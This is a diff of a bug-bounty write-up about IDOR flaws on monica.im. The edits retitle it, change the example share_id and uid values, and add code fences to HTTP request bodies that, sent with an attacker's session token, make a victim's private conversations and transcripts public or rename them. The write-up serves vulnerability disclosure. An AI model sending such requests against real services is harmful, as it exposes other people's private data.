@@ -1,5 +1,5 @@
 ---
-title: Broken Access Control (IDOR) on monica.im: Manipulating Privacy Settings and Metadata Across Multiple Endpoints
+title: Unlocking Private Conversations - Exploiting Systemic IDOR Vulnerabilities on monica.im
 description: Insecure Direct Object Reference (IDOR) / Broken Access Control
 date: 2026-07-06
 categories: [Meta bug bounty]
@@ -43,8 +43,9 @@ Authorization: [Attacker_Session_Token]
 
 {
   "permission": "public",
-  "share_id": "0XObvzcBOwiMNQCi"
+  "share_id": "0XObvzESWSOwiMNQCi"
 }
+```
 
 4. **Result:** The server accepts the request and changes the conversation status back to Public. The attacker can now view the victim's private conversation again using the original share link.
 
@@ -67,9 +68,10 @@ Content-Type: application/json
 Authorization: [Attacker_Session_Token]
 
 {
-  "share_id": "0XObvzcBOwiMNQCi",
+  "share_id": "0XObvzAQOwiMNQCi",
   "title": "Modified by Attacker (IDOR)"
 }
+```
 
 #### Vulnerability 3: AI Audio-to-Text Privacy Manipulation
 
@@ -92,8 +94,10 @@ Authorization: [Attacker_Session_Token]
 
 {
   "all_can_visits": true,
-  "uid": "c7948003-e95a-4300-b52b-3a326d6f5"
+  "uid": "c7948003-e05a-4300-b54b-3a32616f5"
 }
+
+```
 
 ### 📅 Timeline
 
